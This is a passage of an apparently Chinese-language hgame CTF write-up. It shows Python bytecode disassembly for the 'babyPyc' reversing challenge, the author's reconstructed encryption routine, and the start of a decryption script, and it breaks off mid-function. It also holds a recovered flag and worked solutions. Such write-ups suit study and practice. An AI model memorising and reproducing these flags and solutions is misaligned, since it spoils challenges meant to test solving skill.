+    <span style="color:#66d9ef">return</span> c<span style="color:#f92672">.</span>decode()
+
+<span style="color:#66d9ef">print</span>(decrypt(cipher))
+<span style="color:#75715e">## hgame{sT4cK_1$_sO_e@Sy~~}</span>
+</code></pre></div><p>拿到flag</p>
+<h4 id="babypyc">babyPyc</h4>
+<p>下载pyc文件，用<a href="https://github.com/zrax/pycdc">pycdc</a>打开拿到编字节码指令（直接反汇编成源码文件别想了，尝试过，没用，所以纯手逆了。。）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">babyPyc_task_e89562fbda<span style="color:#f92672">.</span>cpython<span style="color:#f92672">-</span><span style="color:#ae81ff">37.</span>pyc (Python <span style="color:#ae81ff">3.7</span>)
+[Disassembly]
+    <span style="color:#ae81ff">0</span>       LOAD_GLOBAL             <span style="color:#ae81ff">0</span>: <span style="color:#66d9ef">print</span>
+    <span style="color:#ae81ff">2</span>       LOAD_CONST              <span style="color:#ae81ff">1</span>: <span style="color:#e6db74">&#39;Give me the flag&#39;</span>
+    <span style="color:#ae81ff">4</span>       CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">6</span>       POP_TOP
+    <span style="color:#ae81ff">8</span>       LOAD_GLOBAL             <span style="color:#ae81ff">1</span>: input
+    <span style="color:#ae81ff">10</span>      LOAD_CONST              <span style="color:#ae81ff">2</span>: <span style="color:#e6db74">&#39;&gt; &#39;</span>
+    <span style="color:#ae81ff">12</span>      CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">14</span>      STORE_FAST              <span style="color:#ae81ff">0</span>: flag
+    <span style="color:#ae81ff">16</span>      LOAD_FAST               <span style="color:#ae81ff">0</span>: flag
+    <span style="color:#ae81ff">18</span>      LOAD_METHOD             <span style="color:#ae81ff">2</span>: encode
+    <span style="color:#ae81ff">20</span>      CALL_METHOD             <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">22</span>      STORE_FAST              <span style="color:#ae81ff">0</span>: flag
+    <span style="color:#ae81ff">24</span>      LOAD_CONST              <span style="color:#ae81ff">3</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;QpeZYrN+Wr2iUZKYcZhvjbPcf4mfyL/tjtfNxM3JR3JPZX5Q&#39;</span>
+    <span style="color:#ae81ff">26</span>      STORE_GLOBAL            <span style="color:#ae81ff">3</span>: O0o
+    <span style="color:#ae81ff">28</span>      LOAD_FAST               <span style="color:#ae81ff">0</span>: flag
+    <span style="color:#ae81ff">30</span>      RETURN_VALUE  
+[Disassembly]
+    <span style="color:#ae81ff">0</span>       BUILD_LIST              <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">2</span>       LOAD_FAST               <span style="color:#ae81ff">0</span>: <span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">4</span>       FOR_ITER                <span style="color:#ae81ff">20</span> (to <span style="color:#ae81ff">26</span>)
+    <span style="color:#ae81ff">6</span>       STORE_FAST              <span style="color:#ae81ff">1</span>: row
+    <span style="color:#ae81ff">8</span>       LOAD_GLOBAL             <span style="color:#ae81ff">0</span>: raw_flag
+    <span style="color:#ae81ff">10</span>      LOAD_CONST              <span style="color:#ae81ff">0</span>: <span style="color:#ae81ff">6</span>
+    <span style="color:#ae81ff">12</span>      LOAD_FAST               <span style="color:#ae81ff">1</span>: row
+    <span style="color:#ae81ff">14</span>      BINARY_MULTIPLY
+    <span style="color:#ae81ff">16</span>      LOAD_DEREF              <span style="color:#ae81ff">0</span>: col
+    <span style="color:#ae81ff">18</span>      BINARY_ADD
+    <span style="color:#ae81ff">20</span>      BINARY_SUBSCR
+    <span style="color:#ae81ff">22</span>      LIST_APPEND             <span style="color:#ae81ff">2</span>
+    <span style="color:#ae81ff">24</span>      JUMP_ABSOLUTE           <span style="color:#ae81ff">4</span>
+    <span style="color:#ae81ff">26</span>      RETURN_VALUE         
+[Disassembly]
+    <span style="color:#ae81ff">0</span>       BUILD_LIST              <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">2</span>       LOAD_FAST               <span style="color:#ae81ff">0</span>: <span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">4</span>       FOR_ITER                <span style="color:#ae81ff">26</span> (to <span style="color:#ae81ff">32</span>)
+    <span style="color:#ae81ff">6</span>       STORE_DEREF             <span style="color:#ae81ff">0</span>: col
+    <span style="color:#ae81ff">8</span>       LOAD_CLOSURE            <span style="color:#ae81ff">0</span>: col
+    <span style="color:#ae81ff">10</span>      BUILD_TUPLE             <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">12</span>      LOAD_CONST              <span style="color:#ae81ff">0</span>: <span style="color:#f92672">&lt;</span>CODE<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span>listcomp<span style="color:#f92672">&gt;</span>
+    <span style="color:#ae81ff">14</span>      LOAD_CONST              <span style="color:#ae81ff">1</span>: <span style="color:#e6db74">&#39;&lt;listcomp&gt;.&lt;listcomp&gt;&#39;</span>
+    <span style="color:#ae81ff">16</span>      MAKE_FUNCTION           <span style="color:#ae81ff">8</span>
+    <span style="color:#ae81ff">18</span>      LOAD_GLOBAL             <span style="color:#ae81ff">0</span>: range
+    <span style="color:#ae81ff">20</span>      LOAD_CONST              <span style="color:#ae81ff">2</span>: <span style="color:#ae81ff">6</span>
+    <span style="color:#ae81ff">22</span>      CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">24</span>      GET_ITER
+    <span style="color:#ae81ff">26</span>      CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">28</span>      LIST_APPEND             <span style="color:#ae81ff">2</span>
+    <span style="color:#ae81ff">30</span>      JUMP_ABSOLUTE           <span style="color:#ae81ff">4</span>
+    <span style="color:#ae81ff">32</span>      RETURN_VALUE
+[Disassembly]
+    <span style="color:#ae81ff">0</span>       JUMP_ABSOLUTE           <span style="color:#ae81ff">2</span>
+    <span style="color:#ae81ff">2</span>       LOAD_CONST              <span style="color:#ae81ff">0</span>: <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">4</span>       LOAD_CONST              <span style="color:#ae81ff">1</span>: None
+    <span style="color:#ae81ff">6</span>       IMPORT_NAME             <span style="color:#ae81ff">0</span>: os
+    <span style="color:#ae81ff">8</span>       STORE_NAME              <span style="color:#ae81ff">0</span>: os
+    <span style="color:#ae81ff">10</span>      LOAD_CONST              <span style="color:#ae81ff">0</span>: <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">12</span>      LOAD_CONST              <span style="color:#ae81ff">1</span>: None
+    <span style="color:#ae81ff">14</span>      IMPORT_NAME             <span style="color:#ae81ff">1</span>: sys
+    <span style="color:#ae81ff">16</span>      STORE_NAME              <span style="color:#ae81ff">1</span>: sys
+    <span style="color:#ae81ff">18</span>      LOAD_CONST              <span style="color:#ae81ff">0</span>: <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">20</span>      LOAD_CONST              <span style="color:#ae81ff">2</span>: (<span style="color:#e6db74">&#39;b64encode&#39;</span>,)
+    <span style="color:#ae81ff">22</span>      IMPORT_NAME             <span style="color:#ae81ff">2</span>: base64
+    <span style="color:#ae81ff">24</span>      IMPORT_FROM             <span style="color:#ae81ff">3</span>: b64encode
+    <span style="color:#ae81ff">26</span>      STORE_NAME              <span style="color:#ae81ff">3</span>: b64encode
+    <span style="color:#ae81ff">28</span>      POP_TOP
+    <span style="color:#ae81ff">30</span>      LOAD_CONST              <span style="color:#ae81ff">3</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/KDq6pvN/LLq6tzM/KXq59Oh/MTqxtOTxdrqs8OoR3V1X09J&#39;</span>
+    <span style="color:#ae81ff">32</span>      STORE_GLOBAL            <span style="color:#ae81ff">4</span>: O0o                <span style="color:#75715e"># O0o = b&#39;/KDq6pvN/LLq6tzM/KXq59Oh/MTqxtOTxdrqs8OoR3V1X09J&#39;</span>
+    <span style="color:#ae81ff">34</span>      LOAD_CONST              <span style="color:#ae81ff">4</span>: <span style="color:#f92672">&lt;</span>CODE<span style="color:#f92672">&gt;</span> getFlag
+    <span style="color:#ae81ff">36</span>      LOAD_CONST              <span style="color:#ae81ff">5</span>: <span style="color:#e6db74">&#39;getFlag&#39;</span>
+    <span style="color:#ae81ff">38</span>      MAKE_FUNCTION           <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">40</span>      STORE_NAME              <span style="color:#ae81ff">5</span>: getFlag
+    <span style="color:#ae81ff">42</span>      LOAD_NAME               <span style="color:#ae81ff">5</span>: getFlag
+    <span style="color:#ae81ff">44</span>      CALL_FUNCTION           <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">46</span>      STORE_NAME              <span style="color:#ae81ff">6</span>: flag
+    <span style="color:#ae81ff">48</span>      LOAD_NAME               <span style="color:#ae81ff">6</span>: flag
+    <span style="color:#ae81ff">50</span>      LOAD_CONST              <span style="color:#ae81ff">1</span>: None
+    <span style="color:#ae81ff">52</span>      LOAD_CONST              <span style="color:#ae81ff">6</span>: <span style="color:#ae81ff">6</span>
+    <span style="color:#ae81ff">54</span>      BUILD_SLICE             <span style="color:#ae81ff">2</span>
+    <span style="color:#ae81ff">56</span>      BINARY_SUBSCR
+    <span style="color:#ae81ff">58</span>      LOAD_CONST              <span style="color:#ae81ff">7</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hgame{&#39;</span>           <span style="color:#75715e"># 格式判断</span>
+    <span style="color:#ae81ff">60</span>      COMPARE_OP              <span style="color:#ae81ff">3</span> (<span style="color:#f92672">!=</span>)
+    <span style="color:#ae81ff">62</span>      POP_JUMP_IF_TRUE        <span style="color:#ae81ff">76</span>
+    <span style="color:#ae81ff">64</span>      LOAD_NAME               <span style="color:#ae81ff">6</span>: flag
+    <span style="color:#ae81ff">66</span>      LOAD_CONST              <span style="color:#ae81ff">8</span>: <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">68</span>      BINARY_SUBSCR
+    <span style="color:#ae81ff">70</span>      LOAD_CONST              <span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">125</span>
+    <span style="color:#ae81ff">72</span>      COMPARE_OP              <span style="color:#ae81ff">3</span> (<span style="color:#f92672">!=</span>)
+    <span style="color:#ae81ff">74</span>      POP_JUMP_IF_FALSE       <span style="color:#ae81ff">94</span>
+    <span style="color:#ae81ff">76</span>      LOAD_NAME               <span style="color:#ae81ff">7</span>: <span style="color:#66d9ef">print</span>
+    <span style="color:#ae81ff">78</span>      LOAD_CONST              <span style="color:#ae81ff">10</span>: <span style="color:#e6db74">&#39;Incorrect format!&#39;</span>
+    <span style="color:#ae81ff">80</span>      CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">82</span>      POP_TOP
+    <span style="color:#ae81ff">84</span>      LOAD_NAME               <span style="color:#ae81ff">1</span>: sys
+    <span style="color:#ae81ff">86</span>      LOAD_METHOD             <span style="color:#ae81ff">8</span>: exit
+    <span style="color:#ae81ff">88</span>      LOAD_CONST              <span style="color:#ae81ff">11</span>: <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">90</span>      CALL_METHOD             <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">92</span>      POP_TOP
+    <span style="color:#ae81ff">94</span>      LOAD_NAME               <span style="color:#ae81ff">6</span>: flag
+    <span style="color:#ae81ff">96</span>      LOAD_CONST              <span style="color:#ae81ff">6</span>: <span style="color:#ae81ff">6</span>
+    <span style="color:#ae81ff">98</span>      LOAD_CONST              <span style="color:#ae81ff">8</span>: <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">100</span>     BUILD_SLICE             <span style="color:#ae81ff">2</span>
+    <span style="color:#ae81ff">102</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">104</span>     STORE_NAME              <span style="color:#ae81ff">9</span>: raw_flag      <span style="color:#75715e"># 去掉 b&#39;hgame{&#39; and b&#39;}&#39; 的原始flag</span>
+    <span style="color:#ae81ff">106</span>     LOAD_NAME               <span style="color:#ae81ff">10</span>: len
+    <span style="color:#ae81ff">108</span>     LOAD_NAME               <span style="color:#ae81ff">6</span>: flag
+    <span style="color:#ae81ff">110</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">112</span>     LOAD_CONST              <span style="color:#ae81ff">12</span>: <span style="color:#ae81ff">7</span>
+    <span style="color:#ae81ff">114</span>     BINARY_SUBTRACT
+    <span style="color:#ae81ff">116</span>     LOAD_CONST              <span style="color:#ae81ff">13</span>: <span style="color:#ae81ff">36</span>           <span style="color:#75715e"># 原始flag 长度为36</span>
+    <span style="color:#ae81ff">118</span>     COMPARE_OP              <span style="color:#ae81ff">3</span> (<span style="color:#f92672">!=</span>)
+    <span style="color:#ae81ff">120</span>     POP_JUMP_IF_FALSE       <span style="color:#ae81ff">140</span>
+    <span style="color:#ae81ff">122</span>     LOAD_NAME               <span style="color:#ae81ff">7</span>: <span style="color:#66d9ef">print</span>
+    <span style="color:#ae81ff">124</span>     LOAD_CONST              <span style="color:#ae81ff">14</span>: <span style="color:#e6db74">&#39;Wrong length!&#39;</span>
+    <span style="color:#ae81ff">126</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">128</span>     POP_TOP
+    <span style="color:#ae81ff">130</span>     LOAD_NAME               <span style="color:#ae81ff">1</span>: sys
+    <span style="color:#ae81ff">132</span>     LOAD_METHOD             <span style="color:#ae81ff">8</span>: exit
+    <span style="color:#ae81ff">134</span>     LOAD_CONST              <span style="color:#ae81ff">15</span>: <span style="color:#ae81ff">2</span>
+    <span style="color:#ae81ff">136</span>     CALL_METHOD             <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">138</span>     POP_TOP
+    <span style="color:#ae81ff">140</span>     LOAD_NAME               <span style="color:#ae81ff">9</span>: raw_flag
+    <span style="color:#ae81ff">142</span>     LOAD_CONST              <span style="color:#ae81ff">1</span>: None
+    <span style="color:#ae81ff">144</span>     LOAD_CONST              <span style="color:#ae81ff">1</span>: None
+    <span style="color:#ae81ff">146</span>     LOAD_CONST              <span style="color:#ae81ff">8</span>: <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">148</span>     BUILD_SLICE             <span style="color:#ae81ff">3</span>                <span style="color:#75715e"># raw_flag[::-1]</span>
+    <span style="color:#ae81ff">150</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">152</span>     STORE_NAME              <span style="color:#ae81ff">9</span>: raw_flag
+<span style="color:#75715e">####</span>
+    <span style="color:#ae81ff">154</span>     LOAD_CONST              <span style="color:#ae81ff">16</span>: <span style="color:#f92672">&lt;</span>CODE<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span>listcomp<span style="color:#f92672">&gt;</span>
+    <span style="color:#ae81ff">156</span>     LOAD_CONST              <span style="color:#ae81ff">17</span>: <span style="color:#e6db74">&#39;&lt;listcomp&gt;&#39;</span>
+    <span style="color:#ae81ff">158</span>     MAKE_FUNCTION           <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">160</span>     LOAD_NAME               <span style="color:#ae81ff">11</span>: range
+    <span style="color:#ae81ff">162</span>     LOAD_CONST              <span style="color:#ae81ff">6</span>: <span style="color:#ae81ff">6</span>
+    <span style="color:#ae81ff">164</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">166</span>     GET_ITER
+    <span style="color:#ae81ff">168</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">170</span>     STORE_NAME              <span style="color:#ae81ff">12</span>: _ciphers
+<span style="color:#75715e">## for row in range(5):</span>
+    <span style="color:#ae81ff">172</span>     SETUP_LOOP              <span style="color:#ae81ff">86</span> (to <span style="color:#ae81ff">260</span>)
+    <span style="color:#ae81ff">174</span>     LOAD_NAME               <span style="color:#ae81ff">11</span>: range
+    <span style="color:#ae81ff">176</span>     LOAD_CONST              <span style="color:#ae81ff">18</span>: <span style="color:#ae81ff">5</span>
+    <span style="color:#ae81ff">178</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">180</span>     GET_ITER
+    <span style="color:#ae81ff">182</span>     FOR_ITER                <span style="color:#ae81ff">74</span> (to <span style="color:#ae81ff">258</span>)
+    <span style="color:#ae81ff">184</span>     STORE_NAME              <span style="color:#ae81ff">13</span>: row
+<span style="color:#75715e">## for col in range(6):</span>
+    <span style="color:#ae81ff">186</span>     SETUP_LOOP              <span style="color:#ae81ff">68</span> (to <span style="color:#ae81ff">256</span>)
+    <span style="color:#ae81ff">188</span>     LOAD_NAME               <span style="color:#ae81ff">11</span>: range
+    <span style="color:#ae81ff">190</span>     LOAD_CONST              <span style="color:#ae81ff">6</span>: <span style="color:#ae81ff">6</span>
+    <span style="color:#ae81ff">192</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">194</span>     GET_ITER
+    <span style="color:#ae81ff">196</span>     FOR_ITER                <span style="color:#ae81ff">56</span> (to <span style="color:#ae81ff">254</span>)
+    <span style="color:#ae81ff">198</span>     STORE_NAME              <span style="color:#ae81ff">14</span>: col
+<span style="color:#75715e">##</span>
+    <span style="color:#ae81ff">200</span>     LOAD_NAME               <span style="color:#ae81ff">12</span>: _ciphers
+    <span style="color:#ae81ff">202</span>     LOAD_NAME               <span style="color:#ae81ff">13</span>: row
+    <span style="color:#ae81ff">204</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">206</span>     LOAD_NAME               <span style="color:#ae81ff">14</span>: col
+    <span style="color:#ae81ff">208</span>     DUP_TOP_TWO
+    <span style="color:#ae81ff">210</span>     BINARY_SUBSCR
+
+    <span style="color:#ae81ff">212</span>     LOAD_NAME               <span style="color:#ae81ff">12</span>: _ciphers
+    <span style="color:#ae81ff">214</span>     LOAD_NAME               <span style="color:#ae81ff">13</span>: row
+    <span style="color:#ae81ff">216</span>     LOAD_CONST              <span style="color:#ae81ff">11</span>: <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">218</span>     BINARY_ADD
+    <span style="color:#ae81ff">220</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">222</span>     LOAD_NAME               <span style="color:#ae81ff">14</span>: col
+    <span style="color:#ae81ff">224</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">226</span>     INPLACE_ADD
+    <span style="color:#ae81ff">228</span>     ROT_THREE
+    <span style="color:#ae81ff">230</span>     STORE_SUBSCR
+<span style="color:#75715e">##-@</span>
+    <span style="color:#ae81ff">232</span>     LOAD_NAME               <span style="color:#ae81ff">12</span>: _ciphers
+    <span style="color:#ae81ff">234</span>     LOAD_NAME               <span style="color:#ae81ff">13</span>: row
+    <span style="color:#ae81ff">236</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">238</span>     LOAD_NAME               <span style="color:#ae81ff">14</span>: col
+    <span style="color:#ae81ff">240</span>     DUP_TOP_TWO
+    <span style="color:#ae81ff">242</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">244</span>     LOAD_CONST              <span style="color:#ae81ff">19</span>: <span style="color:#ae81ff">256</span>
+    <span style="color:#ae81ff">246</span>     INPLACE_MODULO
+    <span style="color:#ae81ff">248</span>     ROT_THREE
+    <span style="color:#ae81ff">250</span>     STORE_SUBSCR
+    <span style="color:#ae81ff">252</span>     JUMP_ABSOLUTE           <span style="color:#ae81ff">196</span>
+    <span style="color:#ae81ff">254</span>     POP_BLOCK
+    <span style="color:#ae81ff">256</span>     JUMP_ABSOLUTE           <span style="color:#ae81ff">182</span>
+    <span style="color:#ae81ff">258</span>     POP_BLOCK
+<span style="color:#75715e">##</span>
+    <span style="color:#ae81ff">260</span>     LOAD_CONST              <span style="color:#ae81ff">20</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#ae81ff">262</span>     STORE_NAME              <span style="color:#ae81ff">15</span>: cipher
+<span style="color:#75715e">####</span>
+    <span style="color:#ae81ff">264</span>     SETUP_LOOP              <span style="color:#ae81ff">70</span> (to <span style="color:#ae81ff">336</span>)
+    <span style="color:#ae81ff">266</span>     LOAD_NAME               <span style="color:#ae81ff">11</span>: range
+    <span style="color:#ae81ff">268</span>     LOAD_CONST              <span style="color:#ae81ff">6</span>: <span style="color:#ae81ff">6</span>
+    <span style="color:#ae81ff">270</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">272</span>     GET_ITER
+    <span style="color:#ae81ff">274</span>     FOR_ITER                <span style="color:#ae81ff">58</span> (to <span style="color:#ae81ff">334</span>)
+    <span style="color:#ae81ff">276</span>     STORE_NAME              <span style="color:#ae81ff">13</span>: row
+    <span style="color:#75715e">###</span>
+    <span style="color:#ae81ff">278</span>     LOAD_CONST              <span style="color:#ae81ff">0</span>: <span style="color:#ae81ff">0</span>
+    <span style="color:#ae81ff">280</span>     STORE_NAME              <span style="color:#ae81ff">14</span>: col
+    <span style="color:#ae81ff">282</span>     SETUP_LOOP              <span style="color:#ae81ff">46</span> (to <span style="color:#ae81ff">330</span>)
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">284</span>     LOAD_NAME               <span style="color:#ae81ff">14</span>: col
+    <span style="color:#ae81ff">286</span>     LOAD_CONST              <span style="color:#ae81ff">6</span>: <span style="color:#ae81ff">6</span>
+    <span style="color:#ae81ff">288</span>     COMPARE_OP              <span style="color:#ae81ff">0</span> (<span style="color:#f92672">&lt;</span>)
+    <span style="color:#ae81ff">290</span>     POP_JUMP_IF_FALSE       <span style="color:#ae81ff">328</span>
+<span style="color:#75715e">##</span>
+    <span style="color:#ae81ff">294</span>     LOAD_NAME               <span style="color:#ae81ff">15</span>: cipher
+    <span style="color:#ae81ff">296</span>     LOAD_NAME               <span style="color:#ae81ff">16</span>: bytes
+    <span style="color:#ae81ff">298</span>     LOAD_NAME               <span style="color:#ae81ff">12</span>: _ciphers
+    <span style="color:#ae81ff">300</span>     LOAD_NAME               <span style="color:#ae81ff">13</span>: row
+    <span style="color:#ae81ff">302</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">304</span>     LOAD_NAME               <span style="color:#ae81ff">14</span>: col
+    <span style="color:#ae81ff">306</span>     BINARY_SUBSCR
+    <span style="color:#ae81ff">308</span>     BUILD_LIST              <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">310</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">312</span>     INPLACE_ADD
+    <span style="color:#ae81ff">314</span>     STORE_NAME              <span style="color:#ae81ff">15</span>: cipher
+<span style="color:#75715e">##</span>
+    <span style="color:#ae81ff">316</span>     LOAD_NAME               <span style="color:#ae81ff">14</span>: col
+    <span style="color:#ae81ff">318</span>     LOAD_CONST              <span style="color:#ae81ff">11</span>: <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">320</span>     INPLACE_ADD
+    <span style="color:#ae81ff">322</span>     STORE_NAME              <span style="color:#ae81ff">14</span>: col
+<span style="color:#75715e">##</span>
+    <span style="color:#ae81ff">324</span>     JUMP_ABSOLUTE           <span style="color:#ae81ff">284</span>
+    <span style="color:#ae81ff">328</span>     POP_BLOCK
+    <span style="color:#ae81ff">330</span>     JUMP_ABSOLUTE           <span style="color:#ae81ff">274</span>
+    <span style="color:#ae81ff">334</span>     POP_BLOCK
+<span style="color:#75715e">##</span>
+    <span style="color:#ae81ff">336</span>     LOAD_NAME               <span style="color:#ae81ff">3</span>: b64encode
+    <span style="color:#ae81ff">338</span>     LOAD_NAME               <span style="color:#ae81ff">15</span>: cipher
+    <span style="color:#ae81ff">340</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">342</span>     STORE_NAME              <span style="color:#ae81ff">15</span>: cipher
+    <span style="color:#ae81ff">344</span>     LOAD_NAME               <span style="color:#ae81ff">15</span>: cipher
+    <span style="color:#ae81ff">346</span>     LOAD_GLOBAL             <span style="color:#ae81ff">4</span>: O0o
+    <span style="color:#ae81ff">348</span>     COMPARE_OP              <span style="color:#ae81ff">2</span> (<span style="color:#f92672">==</span>)
+    <span style="color:#ae81ff">350</span>     POP_JUMP_IF_FALSE       <span style="color:#ae81ff">364</span>
+    <span style="color:#ae81ff">354</span>     LOAD_NAME               <span style="color:#ae81ff">7</span>: <span style="color:#66d9ef">print</span>
+    <span style="color:#ae81ff">356</span>     LOAD_CONST              <span style="color:#ae81ff">21</span>: <span style="color:#e6db74">&#39;Great, this is my flag.&#39;</span>
+    <span style="color:#ae81ff">358</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">360</span>     POP_TOP
+    <span style="color:#ae81ff">362</span>     JUMP_FORWARD            <span style="color:#ae81ff">8</span> (to <span style="color:#ae81ff">372</span>)
+    <span style="color:#ae81ff">364</span>     LOAD_NAME               <span style="color:#ae81ff">7</span>: <span style="color:#66d9ef">print</span>
+    <span style="color:#ae81ff">366</span>     LOAD_CONST              <span style="color:#ae81ff">22</span>: <span style="color:#e6db74">&#39;Wrong flag.&#39;</span>
+    <span style="color:#ae81ff">368</span>     CALL_FUNCTION           <span style="color:#ae81ff">1</span>
+    <span style="color:#ae81ff">370</span>     POP_TOP
+    <span style="color:#ae81ff">372</span>     LOAD_CONST              <span style="color:#ae81ff">1</span>: None
+    <span style="color:#ae81ff">374</span>     RETURN_VALUE
+</code></pre></div><p>上面的指令看了几遍，基本知道意思了，有些地方也标了注释。
+下面是逆出来基本对应的源码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> dis<span style="color:#f92672">,</span> base64
+
+<span style="color:#75715e">## 这里是个迷惑的操作，因为在源码的get_flag函数里会重新赋值到没注释的那个编码段。。</span>
+<span style="color:#75715e">## patten = b&#39;/KDq6pvN/LLq6tzM/KXq59Oh/MTqxtOTxdrqs8OoR3V1X09J&#39;</span>
+patten <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;QpeZYrN+Wr2iUZKYcZhvjbPcf4mfyL/tjtfNxM3JR3JPZX5Q&#39;</span>
+
+<span style="color:#75715e">## def listcomp(it):</span>
+<span style="color:#75715e">##     l = []</span>
+<span style="color:#75715e">##     for col in it:</span>
+<span style="color:#75715e">##         (col, )</span>
+<span style="color:#75715e">##         def f(_it):</span>
+<span style="color:#75715e">##             _l = []</span>
+<span style="color:#75715e">##             for row in _it:</span>
+<span style="color:#75715e">##                 _l.append(raw_flag[6*row+col])</span>
+<span style="color:#75715e">##             return l</span>
+<span style="color:#75715e">##         l.append(f(range(6)))</span>
+<span style="color:#75715e">##     return l</span>
+
+<span style="color:#75715e">## 这里换了个功能相同，简单好懂的函数。。</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">listcomp</span>(l):
+    r <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+        _r <span style="color:#f92672">=</span> []
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+            _r<span style="color:#f92672">.</span>append(i<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span><span style="color:#f92672">*</span>j)
+        r<span style="color:#f92672">.</span>append(_r)
+    <span style="color:#66d9ef">return</span> r
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc</span>(flag):
+    raw_flag <span style="color:#f92672">=</span> flag[<span style="color:#ae81ff">6</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    raw_flag <span style="color:#f92672">=</span> raw_flag[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+    _ciphers <span style="color:#f92672">=</span> listcomp(raw_flag)
+    <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+        <span style="color:#66d9ef">for</span> col <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+            _ciphers[row][col] <span style="color:#f92672">+=</span> _ciphers[row<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>][col]
+            _ciphers[row][col] <span style="color:#f92672">%=</span> <span style="color:#ae81ff">256</span>
+    cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+        col <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        <span style="color:#66d9ef">while</span> col <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">6</span>:
+            cipher <span style="color:#f92672">+=</span> bytes([_ciphers[row][col]])
+            col <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(cipher)
+
+<span style="color:#75715e">##print(dis.dis(enc))</span>
+</code></pre></div><p>然后就是简单的crypto题了。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unlistcomp</span>(l):
